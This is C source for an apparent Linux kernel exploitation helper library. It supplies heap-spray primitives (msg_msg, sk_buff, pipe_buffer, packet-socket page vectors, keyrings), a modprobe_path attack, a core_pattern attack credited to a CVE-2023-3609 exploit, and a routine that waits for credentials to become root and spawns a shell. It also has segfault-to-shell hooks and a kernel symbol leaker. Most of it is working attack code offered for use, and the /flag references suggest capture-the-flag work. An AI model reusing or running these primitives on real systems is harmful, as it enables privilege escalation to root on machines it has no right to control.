#include "libx.h"


/*
    Utils 
*/
int optmem_max;

int urand_fd=-1;
int pg_vec_child[2],pg_vec_parent[2];

int sk_fd[SOCKET_NUM][2];
int pipe_fd[PIPE_NUM*4][2];

size_t fread_u64(const char *fname)
{
    size_t size = 0x100;
	FILE *f = fopen(fname, "r");
    if(!f) return 0xdeadbeef;
	char *buf = calloc(1,size+1);
	fread(buf, 1, size, f);
	buf[size] = 0;
	fclose(f);
	return atoll(buf);
}
size_t MSGLIMIT = 0 ;
size_t msgLimit(){
    if(!MSGLIMIT){
        size_t size = fread_u64(MSGMNB_FILE);;
        if(size == 0xdeadbeef || size == 0)
        {
            warn("Failed to load MSG Limit, asssume it's 8192");
            size = 8192;
        }    
        MSGLIMIT = size;
        return size;
    }else{
        return MSGLIMIT;
    }
}

__u8 * dpn(int c,size_t n,size_t nn){
    FAIL(nn<n,"Wrong usage of dpn");
    char* res = malloc(nn+1);
    memset(res,0,nn);
    memset(res,c,n);
    res[n] = 0;
    return res;
}

__u8 * flatn(size_t *values,size_t n){
    size_t * res = malloc(sizeof(size_t)*n+1);
    for(int i = 0 ; i < n; i++){
        res[i] = values[i];
    }
    return (__u8 *)res;
}

int findp64(__u8 *stack,size_t value, size_t n){
    size_t * ptr;
    FAIL_IF(n<8);
    for(size_t i =0 ; i <= n-8; i++){
        ptr = (size_t *)&stack[i];
        if(value == *ptr)
            return i;
    }
    return -1;
}
char *str(int a){
    char *res = malloc(0x100);
    sprintf(res, "%d", a);
    return res;
}

char *strdupn(char *s, size_t size){
    char * res = calloc(1,size);
    strcpy(res,s);
    return res;
}

void *mmapx(void *addr, size_t size)
{
	return mmap(addr, size, 7 , 0x21, -1, 0);
}
__u8 * dp(int c,size_t n){
    __u8* res = calloc(1,n+1);
    memset(res,c,n);
    res[n] = 0;
    return res;
}

void shell(){
    FAIL(getuid(),"[!] Failed to Escape");
    system("/bin/sh");
}
void forkShell(){
    FAIL(getuid(),"[!] Failed to Escape");
    if(!fork()){
        system("/bin/sh");
    }
    else{
        sleep(3600);
    }
}
size_t xswab(size_t val){
    size_t res = 0;
    size_t  arr[0x8] = {0};
    for(int i = 0 ; i <0x8;i++){
        arr[i] = val&0xff;
        val = val>>8;
    }
    for(int i = 0 ; i < 0x8 ; i++){
        res*=0x100;
        res+=arr[i];
    }
    return res;
}
void modprobeAtk(char * path, char * cmd){
    // Create a funky file as trigger 
    char * buf = calloc(1,0x400);
    snprintf(buf,0x400-1,"echo -ne '\\xff' > %s/funky_guy",path);
    system(buf);
    // Create a file to execute code as root
    memset(buf,0,0x400);
    snprintf(buf,0x400-1,"echo '#!/bin/sh\n%s\n' > %s/n132",cmd,path);
    system(buf);
    // change mode
    memset(buf,0,0x400);
    snprintf(buf,0x400-1,"chmod 777 %s/funky_guy; chmod 777 %s/n132; %s/funky_guy 2>%s/null;",path,path,path,path);
    system(buf);
}




/*
    Part I: Basics, not specific-technique-related
*/

/*
    Name: Set a Handler of Segfault
    Desc:
        If kernel Heap is borken we can use to process a SEGFAULT and spawn a shell
*/
void _sigsegv_handler(int sig, siginfo_t *si, void *unused) {
    
    info("Libx: SegFault Handler is spwaning a shell...");
    shell();
    while(1); // Techniquly, we never his this line
}
void hook_segfault(){
    struct sigaction sa;
    memset(&sa, 0, sizeof(sigaction));
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_SIGINFO;
    sa.sa_sigaction = _sigsegv_handler;

    if (sigaction(SIGSEGV, &sa, 0) == -1) {
        perror("hook_segfault");
        exit(EXIT_FAILURE);
    }
    if (sigaction(SIGTRAP, &sa, 0) == -1) {
        perror("hook_segfault");
        exit(EXIT_FAILURE);
    }
    // info("SegFault Hooked");
}


/*
    Name: Set SUID for a prorgam
    Desc:
        Provide the name of file. Try to setsuid for it. 
    Example:
        setsuid("/bin/sh");
*/
void setsuid(char *filename){
    mode_t mode = S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH;

    // Attempt to set the suid bit along with the owner's execute permission and read/execute for group and others
    if (chmod(filename, mode) == -1) {
        perror("chmod failed to set suid bit");
        return ;
    }
    printf("Successfully set suid bit on %s\n", filename);
    return ;
}
/*
    Name: Stop the process for debugging
    Desc:
        Stop the process for debugging
    Example:
        debug();
*/
void debug(){
    warn("DEBUG");
    char buf[0x10]={};
    read(0,buf,0xf);
}
void hexdump(char * addr, size_t len){
    printf("HexDump:\n");
    int more = (len%0x10) ? 1:0;
    for(long long unsigned int i = 0 ; i < (len/0x10)+ more; i++){
        printf("0x%016llx:\t0x%016llx\t0x%016llx\n",i*0x10, *(u64 *)(addr+i*0x10), *(u64 *)(addr+i*0x10+8));
    }
}
/*
    Name:p64
    Desc:
        Return a heap pointer of little endian packed 64bit value
    Example:
        p64(0xdeadbeef);
*/
__u8 *p64(size_t val){
    char *res  = calloc(1,0x18);
    size_t * p = (size_t *)res;
    * p = val;
    return res;
}

/*
    MSGMSG related
*/
int msgGet(){
    int res= msgget(0,01644);
    FAIL(res<0,"[-] Failed to create a msg queue");
    return res;
}

void msgSend(int msgid,size_t size,char *text){
    msgMsg* msg = (msgMsg *)calloc(1,sizeof(long)+size+0x1);
    msg->mtype = 04000; // IPC_NOWAIT / Message type (can be any positive integer)
    memcpy(msg->mtext, text, size);
    // Send the message
    if (syscall(SYS_msgsnd, msgid, msg, size, 0)<0) {
        perror("msgsnd");
    }
    free(msg);
    return ;  
}
msgMsg* msgRecv(int msgid,size_t size){
    msgMsg* recv = (msgMsg *)calloc(1,sizeof(long)+size+1);
    if (msgrcv(msgid, recv, size, 0, MSG_NOERROR | IPC_NOWAIT)<0) {
        perror("msgrcv");
        return 0;
    }
    return recv;
}
msgMsg* msgPeek(int msgid,size_t size){
    msgMsg* recv = (msgMsg *)calloc(1,sizeof(long)+size+1);
    if (msgrcv(msgid, recv, size, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY )<0) {
        perror("msgrcv");
        return 0;
    }
    return recv;
}
void msgDel(int msgid){
    if (msgctl(msgid, IPC_RMID, 0) == -1)
        perror("msgctl");
    return; 
}
msgSpray_t * _msgSpray(size_t size,size_t num,__u8* ctx){
    // Create one and reach the per queue limit
    size_t msg_id = msgGet();
    if(!ctx){
        ctx = calloc(1,size+1);
        memset(ctx,0x69,size);
    }
    for(int i = 0 ; i < num ; i++){
        msgSend(msg_id,size,ctx);
    }
    msgSpray_t * record = calloc(1,sizeof(msgSpray_t));
    record->ctx = ctx;
    record->msg_id = msg_id;
    record->num = num;
    record->size = size;
    return record;
}
msgSpray_t * msgSpray(size_t msg_len,size_t num, __u8 *ctx){
    size_t msg_object_size = msg_len+0x30;
    size_t max_msg_num_pre_queue = msgLimit() / msg_object_size;
    if( msg_object_size > MSGLIMIT ) 
        panic("[-] The size of msg object is larger than the limit of msg queue");
    msgSpray_t * ret  = 0;
    msgSpray_t * next = 0;
    size_t this_round = 0;
    while(num > 0){
        this_round = num > max_msg_num_pre_queue ? max_msg_num_pre_queue: num;
        next  = _msgSpray(msg_len, this_round, ctx);
        
        if(ret) next->next  = ret;
        ret = next;
        num -= this_round;
    }
    return ret;
}
void msgSprayClean(msgSpray_t *spray)
{
	while(spray) {
		for(int i=0; i<spray->num; i++) 
			msgRecv(spray->msg_id,spray->size);
		msgDel(spray->msg_id);
		spray = spray->next;
	}
}


/*
    sk_buff
*/
void initSocketArrayN(int sk_socket[SOCKET_NUM][2],size_t nr){
    for(int i = 0 ; i < nr ; i++)
        FAIL(socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i])< 0,"[-] Failed to create sockect pairs!");
}
void initSocketArray(int sk_socket[SOCKET_NUM][2]){
    for(int i = 0 ; i < SOCKET_NUM ; i++)
        FAIL(socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i])< 0, "[-] Failed to create sockect pairs!");
}
void spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size){
    // There is a 0x140 area after the buffer
    for(int i = 0 ; i< SOCKET_NUM ; i++)
        for(int j = 0 ; j < SK_BUFF_NUM ; j++)
            FAIL(write(sk_socket[i][0], buf, size)< 0, "[-] Failed to spraySkBuff");
}
void skbuffSend(int skt,__u8 * ctx, size_t size){
    FAIL(write(skt, ctx, size)<0,"[!] Failed skbuff_add");
}

/*
    pipe_buffer
*/

void initPipeBuffer(int pipe_fd[PIPE_NUM][2]){
    for(int i  = 0 ; i < PIPE_NUM ; i++)
    {
        FAIL( pipe(pipe_fd[i])<0 , "Failed to allocate pipe buffers" );
        write(pipe_fd[i][1], "pipe_buffer init", 16);
    }
    // success("pipe_buffer Inited");
}
void initPipeBufferN(int pipe_fd[PIPE_NUM][2],int num){
    for(int i  = 0 ; i < num ; i++)
    {
        FAIL( pipe(pipe_fd[i])<0 , "Failed to allocate pipe buffers" );
        write(pipe_fd[i][1], "pipe_buffer init", 16);
    }
    // success("pipe_buffer Inited");
}
void pipeBufferResize(int fd,size_t count){
    // pipe_buffer init
    size_t res = fcntl(fd,F_SETPIPE_SZ,0x1000*count);
    if(res ==0x1000*count)
        return;// info("PipeBuffer resized");
    else
        panic("Failed to resize the PipeBuffer");
}
void pipeBufferClose(int fd[2]){
    close(fd[0]);
    close(fd[1]);
}

/*
    DEBUG 
*/
void leak_kallsyms(char *func){
    char * buf = calloc(1,0x101);
    strncpy(buf,"cat /proc/kallsyms | grep ' ",0x100);
    strncat(buf,func,0x100);
    strncat(buf,"'\0",0x100);
    system(buf);
}
void magic(){
    printf("0x");
    fflush(stdout);
    leak_kallsyms("commit_creds");
    printf("0x");
    fflush(stdout);
    leak_kallsyms("init_cred");
    printf("0x");
    fflush(stdout);
    leak_kallsyms("swapgs_restore_regs_and_return_to_usermode");
}

#define PAGE_ALLOC_COSTLY_ORDER 3
#define DIV_ROUND_UP __KERNEL_DIV_ROUND_UP
#define __KERNEL_DIV_ROUND_UP(n, d) (((n) + (d) - 1) / (d))
size_t slab_size[] = {0x8,0x10,0x20,0x40,0x60,0x80,0xc0,0x100,0x200,0x400,0x800,0x1000,0x2000};
int _nr_objs(int size){
    if(size>=0x1000)
        return 6;
    else if(size>= 1024)
        return 24;
    else if(size>= 256)
        return 52;
    else
        return 120;
}
char *_size2slabsize(int size){
    if(size<=0x200)
        return  str(size);
    else if(size==0x400)
        return "1k";
    else if(size==0x800)
        return "2k";
    else if(size==0x1000)
        return "4k";
    else if(size==0x2000)
        return "8k";
    else
        panic("_size2slabsize");
}
int _system_ret_int(char *cmd)
{    char buffer[128];
    int result = 0;
    FILE *fp;

    // Run the system command and open a pipe to read its output
    fp = popen(cmd, "r");
    if (fp == 0) 
        panic("Failed to run command\n");
    

    // Read the output a line at a time
    if (fgets(buffer, sizeof(buffer), fp) != 0) 
        result = atoi(buffer);
    

    // Close the pipe
    pclose(fp);
    return result;
}




void sandbox()
{   //unshare -r
    uid_t uid = getuid();
    gid_t gid = getgid();
    int temp;
    char edit[0x100];
    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}

/*
    PG_VEC

    Usage:  
    ```
    pgvInit();
    for(int i = 0 ; i < 0x100 ; i++)
        pgvCmd(ADD,i,order,num);
    ```
*/
typedef struct pgv_frame{
    int fd;
    char * mapped;
    size_t size;
}pgvFrame;

pgvFrame pgv[INITIAL_PG_VEC_SPRAY] = {};

u64 _pvg_sock(u64 size, u64 n)
{
    struct tpacket_req req;
    u32 socketfd, version;
    socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    FAIL_IF(socketfd<0);

    version = TPACKET_V1;

    FAIL_IF(setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0);


    assert(size % 4096 == 0);

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = n;
    req.tp_frame_size = PAGE_SIZE;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
    FAIL_IF(setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0);
    return socketfd;
}
void _spray_comm_handler()
{
    ipc_req_t req;
    int32_t result;
    do {
        read(pg_vec_child[0], &req, sizeof(req));
        FAIL_IF(req.idx >= INITIAL_PG_VEC_SPRAY);
        if (req.cmd == ADD)
        {
            pgv[req.idx].fd = _pvg_sock(PAGE_SIZE * (1<<req.order), req.arg.nr);
            FAIL(pgv[req.idx].fd <= 0,"[-] PGV not allocated");
            pgv[req.idx].size = PAGE_SIZE * (1<<req.order) * req.arg.nr ;
        }
        else if (req.cmd == FREE)
        {
            close(pgv[req.idx].fd);  
            memset(&pgv[req.idx],0,sizeof(pgvFrame));
        }
        else if(req.cmd == MAP){
            FAIL(pgv[req.idx].fd <= 0,"[-] PGV not allocated");
            void *mapped = mmap(0, pgv[req.idx].size , PROT_READ | PROT_WRITE, MAP_SHARED, pgv[req.idx].fd, 0);
            FAIL((long long )mapped < 0,"[-] FAILED to MAP PGV");
            pgv[req.idx].mapped = mapped;
        }else if(req.cmd == EDIT){
            FAIL( (req.order) > 4, "Fix libx to add this feature!");
            size_t fram_size   = PAGE_SIZE * (1<<req.order);
            FAIL( pgv[req.idx].fd <= 0 || pgv[req.idx].size < fram_size || pgv[req.idx].mapped == 0 ,"[-] PGV not allocated" );
            size_t target_size = pgv[req.idx].size;
            u64 offset = 0;
            for(offset = 0 ; offset < target_size - fram_size ; offset += fram_size)
                memcpy(pgv[req.idx].mapped + offset, (char *)PGV_SHARE_AREA, fram_size);
        }else if(req.cmd == SHOW){
            FAIL( (req.order) > 4, "Fix libx to add this feature!");
            size_t fram_size   = PAGE_SIZE * (1<<req.order);
            FAIL( pgv[req.idx].fd <= 0 || pgv[req.idx].size < fram_size || pgv[req.idx].mapped == 0 ,"[-] PGV not allocated" );
            size_t target_size = pgv[req.idx].size;
            u64 offset = req.arg.offset;   // In show, nr is the offset to read
            FAIL( offset >= target_size, "[-] OOB Read");
            FAIL( offset+fram_size >= target_size, "[-] OOB Read");
            FAIL( offset+fram_size < offset, "[-] OOB Read");
            memcpy((char *)PGV_SHARE_AREA, pgv[req.idx].mapped + offset, fram_size);
        }
        result = req.idx;
        write(pg_vec_parent[1], &result, sizeof(result));
    } while(req.cmd != EXIT);

}

void pgvCmd(enum PG_VEC_CMD cmd, int idx, size_t order, size_t nr)
{
    ipc_req_t req;
    int32_t result;
    req.cmd = cmd;
    req.idx = idx;
    req.order = order;
    req.arg.nr = nr;
    write(pg_vec_child[1], &req, sizeof(req));
    read(pg_vec_parent[0], &result, sizeof(result));
    assert(result == idx);
}

// void spaInit(){
void pgvInit(){
    pipe(pg_vec_child);
    pipe(pg_vec_parent);
    FAIL_IF( mmap((void *)PGV_SHARE_AREA, PAGE_SIZE * (1<<4) , PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0) != (char *)PGV_SHARE_AREA);
    if (!fork())
    {
        // unshare -r 
        sandbox();
        // Setup a hander in the child process waiting for the commands
        _spray_comm_handler();
        exit(1);
    }
}
// Local PGV 
pgvFrame pgvL[0x200] = {};
void pgvInitL(){
    FAIL(getuid()!=0,"not in the sandbox");
}
void pgvAdd(size_t idx, size_t order, size_t nr){
    FAIL(idx>=sizeof(pgvL)/sizeof(pgvL[0]), "Index OOB");
    pgvL[idx].fd = _pvg_sock(PAGE_SIZE * (1<<order), nr);
    FAIL(pgvL[idx].fd <= 0,"[-] PGV not allocated");
    pgvL[idx].size = PAGE_SIZE * (1<<order) * nr ;
}
void pgvDel(size_t idx){
    FAIL(idx>=sizeof(pgvL)/sizeof(pgvL[0]), "Index OOB");
    FAIL(close(pgvL[idx].fd)!=0,hex(pgvL[idx].fd));  
    memset(&pgvL[idx],0,sizeof(pgvFrame));
}
void *pgvMap(int idx){
    FAIL(idx>=sizeof(pgvL)/sizeof(pgvL[0]), "Index OOB");
    FAIL(pgvL[idx].fd <= 0,"[-] PGV not allocated");
    void *mapped = mmap(0, pgvL[idx].size , PROT_READ | PROT_WRITE, MAP_SHARED, pgvL[idx].fd, 0);
    FAIL((long long )mapped < 0,"[-] FAILED to MAP PGV");
    pgvL[idx].mapped = mapped;
    return mapped;
}
void * pgvShow(int idx, size_t offset, size_t size){
    FAIL(idx>=sizeof(pgvL)/sizeof(pgvL[0]), "Index OOB");
    FAIL( pgvL[idx].fd <= 0 || pgvL[idx].size <= offset || pgvL[idx].size <= offset+size || offset+size<=offset || pgvL[idx].mapped == 0 ,"[-] PGV not allocated" );
    char * buffer = calloc(1,size);
    FAIL_IF(buffer<=0);
    memcpy(buffer, pgvL[idx].mapped + offset, size);
}
void pgvEdit(int idx, size_t offset, size_t size, char * buffer){
    FAIL(idx>=sizeof(pgvL)/sizeof(pgvL[0]), "Index OOB");
    FAIL( pgvL[idx].fd <= 0 || pgvL[idx].size <= offset || pgvL[idx].size <= offset+size || offset+size<=offset || pgvL[idx].mapped == 0 ,"[-] PGV not allocated" );
    memcpy(pgvL[idx].mapped + offset,buffer,size);
}

/*
    This function clone a process with little noise and 
    keeps checking if the cred is modified to root. If it's changed to root,
    it returns a root shell.
*/

void _cloneRootShell(void){
    success("Root!");
    seteuid(0);
    system("/bin/sh");
    sleep(1000);
}
__attribute__((naked)) size_t  _cloneRoot(size_t flag,size_t shell_func){

    asm(
        "mov r15, rsi;"
        "xor rsi, rsi;"
        "xor rdx, rdx;"
        "xor r8, r8;"
        "xor r10, r10;"
        "xor r9, r9;"
        "mov rax, 56;"
        "syscall;"
        "cmp rax,0;"
        "jl OUT;"
        "je OUT;"
        "REPEAT:"
        "mov rax, 102;"
        "syscall;"
        "cmp rax,0;"
        "jne REPEAT;"
        "jmp GG;"
        "OUT:"
        "ret;"
        "GG:"
        "jmp r15;"
    );
    while(1);
}
void cloneRoot(void )
{
    _cloneRoot(cloneRoot_FLAG,(size_t)_cloneRootShell);
}

void impLimit(){
    struct rlimit limit;
    // Use prlimit to get the limits for RLIMIT_NOFILE
    pid_t pid = 0;  // 0 refers to the current process
    if (prlimit(pid, RLIMIT_NOFILE, 0, &limit) == -1) {
        perror("prlimit failed");
        return ;
    }

    limit.rlim_cur = limit.rlim_max;  // Soft limit
    limit.rlim_max = limit.rlim_max;  // Hard limit
    // Use prlimit to set the resource limits of the process
    prlimit(pid, RLIMIT_NOFILE, &limit, 0);
}

/*
    timerfd
*/
int createTimer(int tv_sec)
{
    struct itimerspec new_value;
    memset(&new_value, 0, sizeof(new_value));
    new_value.it_value.tv_sec = tv_sec;  // Initial expiration
    new_value.it_interval.tv_sec = 0;  // Interval for periodic timer
    int tfd = timerfd_create(CLOCK_REALTIME, 0);
    timerfd_settime(tfd, 0, &new_value, 0);
    return tfd;
}

int emptyTimer(int tv_sec)
{
    return timerfd_create(CLOCK_REALTIME, 0);
}

/*
    key 
    options, not a good primitive for spray since 
    the limit size for each account
*/
void simpleXattrInit(){
    system("mkdir /tmp/tmpfs");
    system("mount -t tmpfs -o size=50M none /tmp/tmpfs");
    system("echo wtf > /tmp/tmpfs/sattr");
}
int keyAdd(char *description, char *payload, int payload_len){
    return syscall(__NR_add_key, "user", description, payload, payload_len,
                   KEY_SPEC_PROCESS_KEYRING);
}
int keyDel(int keyid){
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}
int keyEdit(int keyid, char *payload, size_t plen){
    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int keyRead(int keyid, char *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}
// 
void pinCPU(int id){
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(id, &my_set);
    sched_setaffinity(0, sizeof(cpu_set_t), &my_set);
}
void set_rflags(unsigned long flags) {
    __asm__ volatile ("push %0; popf" : : "r"(flags) : "cc");
}
void set_gs_base(uint64_t base) {
    __asm__ volatile ("wrgsbase %0" : : "r" (base));
}
size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus()
{
    __asm__ (
        "mov %0, cs;"        // Move cs register to user_cs
        "mov %1, ss;"        // Move ss register to user_ss
        "mov %2, rsp;"       // Move rsp register to user_sp
        "pushf;"             // Push flags register to stack
        "pop %3;"            // Pop flags register into user_rflags
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags) // Output operands
    );
    // printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}
/*
    Initial Function for Libx
    The user may need init with libxInit
*/
void libxInit(){
    pinCPU(0);
    impLimit();
    hook_segfault();
    initPipeBuffer(pipe_fd);
    initSocketArray(sk_fd);
    saveStatus();
    success("Libx Inited");
}
static void __attribute__((constructor)) init(void){
    setvbuf(stdin, 0, _IONBF, 0);
	setvbuf(stdout, 0, _IONBF, 0);

    // urand_fd = open("/dev/urandom", 0);
	// if(unlikely(urand_fd < 0)) panic("Fail to open urandom");
    // size_t seed = 0;
    // read(urand_fd,&seed,sizeof(seed));
    // srand(seed);
    optmem_max = fread_u64(OPTMEM_MAX_FILE);
    // libxInit();
}

// Core pattern Attack
/*
 * - Based on Billy's kernelctf Exploitation (CVE-2023-3609)
 */
// Example:
// int main(int argc, char *argv[]){
//     COREHEAD(argv);
//     // Exp Start
//     // .. Attack to midify the /proc/sys/kernel/core_pattern to 
//     // "|/proc/%P/fd/<crash_arg>"
//     // For example, outside the docker container we run: echo "/proc/%P/fd/666" | sudo tee /proc/sys/kernel/core_pattern
//     CORETAIL(666);
// }

// #define SYS_pidfd_getfd 438

void coreShell(int reboot){
	// Use when core_pattern was modified:
	// /proc/sys/kernel/core_pattern <- "|/proc/%P/fd/666"
    char buf[0x100] = {};
    FILE* fp = popen("pidof n132","r");
	fread(buf,1,0x100,fp);
	fclose(fp);
	int pid         = strtoull(buf,0,10);
	int pfd 		= syscall(SYS_pidfd_open,pid,0);
	int stdinfd 	= syscall(SYS_pidfd_getfd, pfd, 0, 0);
	int stdoutfd 	= syscall(SYS_pidfd_getfd, pfd, 1, 0);
	int stderrfd 	= syscall(SYS_pidfd_getfd, pfd, 2, 0);
	dup2(stdinfd	,0);
	dup2(stdoutfd	,1);
	dup2(stderrfd	,2);
	if(reboot==0)
		system("cat /flag;ls /home/n132");
	else
		system("cat /flag;echo o>/proc/sysrq-trigger;");
}

void crash(int fd)
{
    int memfd = memfd_create("", 0);
    sendfile(memfd, open("main", 0), 0, 0xffffffff);
    dup2(memfd,fd);
    close(memfd);
    char dst[0x100] = {};
    snprintf(dst,sizeof(dst),"|/proc/%%P/fd/%d",fd);
    while (1)
    {
        // Check if /proc/sys/kernel/core_pattern has been overwritten
        char buf[0x100] = {};
        int core = open("/proc/sys/kernel/core_pattern", 0);
        read(core, buf, sizeof(buf));
        close(core);
        if(strncmp(buf, dst, strlen(dst)) == 0)
            *(size_t *)0 = 0;
        sleep(1);
    }
    
}

char *hex(size_t num){
    char *buf = malloc(0x20);
    snprintf(buf,0x20,"%p",(void *)num);
    return buf;
}
void success(const char *text){
    // Green color code
    printf("\033[0;32m[+] ");
    printf("%s", text);
    // Reset to default color
    printf("\033[0m\n");
}
void info(const char *text){
    printf("\033[34m\033[1m[+] %s\033[0m\n",text);
}
void warn(const char* text) {
    // Yellow color code
    printf("\033[0;33m");
    printf("[!] %s", text);
    // Reset to default color
    printf("\033[0m\n");
}
void panic(const char *text){
    // Red color code
    printf("\033[0;31m");
    printf("[X] %s", text);
    // Reset to default color
    printf("\033[0m\n");
    exit(0x132);
}
size_t rdtsc(void)
{
  unsigned long low, high;

  asm volatile(
    "lfence;"
    "sfence;"
    "rdtsc;"
    "sfence;"
    "lfence;"
    : "=a" (low), "=d" (high)
    :
    : "ecx"
  );

  return (low) | (high << 32);
}
